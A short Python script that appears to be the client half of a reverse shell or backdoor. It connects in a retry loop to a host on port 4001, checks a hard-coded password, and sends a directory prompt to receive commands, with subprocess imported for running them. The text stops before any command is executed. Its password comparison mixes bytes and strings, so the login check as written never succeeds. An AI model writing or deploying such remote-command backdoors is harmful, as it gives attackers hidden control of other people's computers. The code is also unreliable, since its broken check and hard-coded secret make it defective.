import subprocess
import socket
import os
def cd(newdir):
	global path, cwd
	path = os.path.normpath(f'{path}/{newdir}')
	cwd = os.path.abspath(path)
	os.chdir(cwd)
ip = socket.gethostname()
port = 4001
pswd = 'password'
srvr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
path = '.'
cwd = os.path.abspath(path)
while True:
	try:
		srvr.connect((ip, port))
		break
	except:
		continue
while True:
	srvr.send(b'@LOGIN')
	msg = srvr.recv(1024).strip()
	if msg == pswd:
		srvr.send(b'@CONNECTED')
		break
	else:
		srvr.send(b'@DENIED')
		continue
while True:
	srvr.send(bytes(f'@GET-INPUT#({cwd})> ', 'utf-8'))
	msg = srvr.recv(1024).strip()